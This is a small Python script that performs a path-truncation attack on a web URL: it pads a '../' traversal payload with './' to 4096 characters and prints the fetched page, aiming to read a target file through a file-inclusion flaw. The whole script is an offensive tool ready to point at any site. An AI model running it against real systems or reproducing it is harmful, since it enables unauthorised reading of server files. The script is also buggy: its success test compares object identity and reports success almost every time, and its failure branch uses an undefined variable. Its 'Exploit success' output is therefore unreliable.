#!/usr/bin/python3
import requests, argparse

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="url to test (like http://example.com?page=)")
parser.add_argument("-t", "--target", help="target file (like admin.html)",)
parser.add_argument("-p", "--payload", help="payload (payload/../targetfile/",)
args = parser.parse_args()

if args.payload:
	payload = args.payload
else:
	payload = "payload/../" + args.target + "/"
	print("Default payload : ", payload)

first = requests.get(args.url + args.target).text

target_size = len(payload)
path_trunc = 4096 - target_size
path_trunc = path_trunc // 2 * "./"

test = args.url + payload + path_trunc

checksize = len(payload + path_trunc)
if checksize == 4096:
	print("Ok, Payload size ", checksize)
else:
	print("Error, Payload size ", checksize)
	quit()

exploit = requests.get(test).text

if first is not exploit:
	print("Exploit success !")
	print(exploit)
else:
	print(url, " not vulnerable")
